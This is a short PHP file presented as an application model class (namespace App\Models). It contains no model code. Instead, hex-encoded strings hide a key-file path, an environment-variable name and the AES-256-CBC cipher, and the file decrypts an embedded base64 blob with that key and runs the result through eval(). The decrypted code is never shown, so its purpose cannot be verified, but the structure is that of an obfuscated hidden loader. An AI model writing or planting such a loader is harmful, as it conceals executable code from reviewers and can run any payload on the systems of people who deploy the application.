<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Q8Wo5eNu1wzMYQoPrFCUIw==');

$c=base64_decode(

't55dWBsY/T6zKQlb2ssCdqkwQPONgaS+EBTQ7Cpoh/LhGg2oveL6Y7iXk2uIY8uLXcNwyiwSt3Of' .
'IrqXpa8V9M/MmK/6pFeB/t4EJdX92KFyBiJgJBEWxo2+oA/IFt07QWs+0Azo7ugwuuta/9kRuc+s' .
'tnrkOtUOuk8MbbhDOJeaNbuaCH9OnyAGXc/UL7x5cuGaZEdcuztfAYua9CQFWkauGOBKQlVuNUA2' .
'COn8Fpe05WuoRp4ehMKvuVLc1AehvRRe99rMkSSbM1vcxfi1MYUQmV66iZ4lhFNoMtl1rNNQhgJ3' .
'JLrryQqWfdkyUb4sgkt8uco6I9cyQfd3kErUYjD1L4xiyY/jc3SOKNFBP/XlUmf+nK3cl8Pie/dC' .
'SWsgaib4ovcVlFNJfJSe0H7HeIkTFqTjjR5bKRgDJV40lf6lH8LPdIf01i66XrATOFpctAKQkq6q' .
'z5GZywB3acg6HXPB4UnH7Oo/xsVT8nkLp/13A9SCJgN9yayz2g0XkKdqxXPdK4BHUH1PD/EFYDdV' .
'WWg6r8XEwwCDbrVO3eKargccDMJ6llqWP71g01ZFlWoTU+q+cI0B6c1opLHZS4szWUyy9vOaeMJ9' .
'KOb7kXrD40Fiz89+rs/GYakgkHlXSl7ogqgGatnAEFDZP9Yw2lVsowdn5uMAEhftDqVqPDJ+bSlN' .
'N+vBnixIXWOO1Mz5qkIsBcsvEgHxj4G00h/Dry2RHW0cF+p7iEC9DsX1cimKev21FSobgsNIZqWV' .
'vEit8nR3SgTQE4uxEeyEBxiyrU7Q5A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

